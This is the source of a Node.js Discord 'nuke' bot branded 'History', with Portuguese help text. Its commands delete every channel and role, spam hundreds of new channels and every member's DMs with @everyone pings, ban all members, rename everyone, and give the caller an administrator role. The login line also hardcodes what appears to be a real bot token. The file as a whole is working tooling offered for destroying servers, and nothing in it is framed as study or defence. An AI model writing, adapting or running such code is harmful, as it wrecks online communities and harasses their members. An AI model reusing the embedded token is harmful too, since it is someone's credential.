const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
client.on("ready", () => {
console.log(chalk.red(`
`))
console.log(chalk.red(""));
console.log(chalk.red(` 
             ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗
             ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝
             ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░
             ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░
             ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░

     ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
     │                                                                        │
     │                .nuke = Destroi o servidor completamente                │
     │                   .delchannel = Apaga todos os chats                   │
     │                  .raid = Cria muitos canais com pings                  │
     │                  .admin = Criar um cargo com perm all                  │
     │                                                                        │
     │                                                                        │
     │                  Use .help para ver todos os comandos                  │
     │                                                                        │
     │                                 BOT Online                             │
     ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
  
presencia();
});
function presencia() {
client.user.setPresence({
status: "dnd",
activity: {
name: "muitas coisas...",
type: "STREAMING"
}
});
}



//** NUKE **//
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.nuke') {
  message.delete()
  message.guild.channels.cache.forEach(channel => channel.delete());
  message.guild.channels.create(`attacked-by-History`, {
  type: 'text'
  }).then(channel => {
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
  })
  for (let i = 0; i <= 500; i++) {
  message.guild.channels.create(`r̷a̷i̷d̷b̷y̷h̷i̷s̷t̷o̷r̷y̷,`, {
  type: 'text'
  }).then(channel => {
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
  })
  }
  message.guild.setName("r̲a̲i̲d̲b̲y̲h̲i̲s̲t̲o̲r̲y̲");
  }
  })
//** NUKE **//
  
  
  
//** BANALL **//
  client.on("message", async message => {
      if(message.content.startsWith('.banall')){
        message.delete();
        message.guild.members.cache.forEach(member => {
          if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
            member.ban();
          }
        })
      }});
//** BANALL **//
  
  
//** DELCHANNEL **//
  client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.delchannel') {
  message.delete()
  message.guild.channels.cache.forEach(channel => channel.delete());
  message.guild.channels.create(`HistoryOWNA`, {
  type: 'text'
  }).then(channel => {
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
  })
  }
  })
//** DELCHANNEL **//
  
  
  
//** RAID **//
  client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.raid') {
  message.delete()
  for (let i = 0; i <= 500; i++) {
  message.guild.channels.create(` ̷r̲a̲i̲d̲b̲y̲h̲i̲s̲t̲o̲r̲y̲`, {
  type: 'text'
  }).then(channel => {
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
    channel.send("@everyone")
    channel.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    channel.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    channel.send("@everyone")
    channel.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    channel.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    channel.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    channel.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    channel.send("@everyone");
  })
  }
  }
  });
//** RAID **//
  
  
  
//** DELROLE **//
  client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === ('.delrole')) {
  message.delete()
  message.guild.roles.cache.map(roles => roles.delete());
  }
  });
//** DELROLE **//
  
  
  
//** CREATEROLE **//
  client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.createrole') {
  message.delete()
  for (let i = 0; i <= 200; i++) {
  message.guild.roles.create({ data: { name: `HistoryOWNA`, color: '#000', }, reason: 'razon', })
  };
  }
  });
//** CREATEROLE **//
  
  
  
//** NICKALL **//
  client.on("message", msg => {
  const args = msg.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.nickall') {
  msg.delete()
  let nickname = args.join(" ");
  var i = 0;
  msg.guild.members.cache.forEach(member => {
  i++
  }
  )
  msg.channel.send("> Modificando o nome de **" + i + "** usuarios para: **" + nickname + "**")
  msg.guild.members.cache.forEach(member => {
  member.setNickname(nickname)
  })
  }
  });
//** NICKALL **//
  
  

//** ADMIN **//
client.on("message", async msg => {
  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('.admin')) {
  let rol = await msg.guild.roles.create({
  data: {
  name: ".",
  color: "000",
  permissions: "ADMINISTRATOR",
  hoisted: false
  }
  })
  msg.member.roles.add(rol)
  .then(function(role) {
  msg.member.addRole(role);
  if (msg.deletable) msg.delete().catch(e => { });
  })
  .catch(e => { });
  }
  });
//** ADMIN **//



//** DMALL **//
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === ".dmall")
  message.delete()
  message.guild.members.cache.forEach(member => {
  setInterval(function() {
    member.send("@everyone");
    member.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
    member.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
    member.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
    member.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
    member.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
    member.send("@everyone");
    member.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
    member.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
    member.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
    member.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
    member.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
    member.send("@everyone").catch(error => { });
  }, 450);
  })
  });
//** DMALL **//



//** HELP **//
client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g );
  const command = args.shift().toLowerCase();
 if (command === '.help') {
     message.delete()
     const embed = new Discord.MessageEmbed()
          .addField('.nuke', `Fode o servidor inteiro`, true)
          .addField('.raid', `Cria muitos canais com pings`, true)
          .addField('.admin', `Cria um cargo com perm all`, true)
          .addField('.createrole', `Cria muitos cargos no servidor`, true)
          .addField('.delrole', `Apaga todos os cargos do servidor`, true)
          .addField('.nickall', `Modifica o nome de todos do servidor`, true)
          .addField('.delchannel', `Apaga todos os canais`, true)
          .setDescription(`**Prefix .**  `)
          .setColor(`#000`)
          .setAuthor('Comandos:')
     message.channel.send(embed)
 }
});
//** HELP **//



//** TOKEN **//
client.login(`MTM3NTk4NDE1MDg1NDYzMTQ2Ng.GzIqFp.2wfdi7CwQLn8dbHLHw3vCB0BHAlFB-OzAerm1c`);
//** TOKEN **//
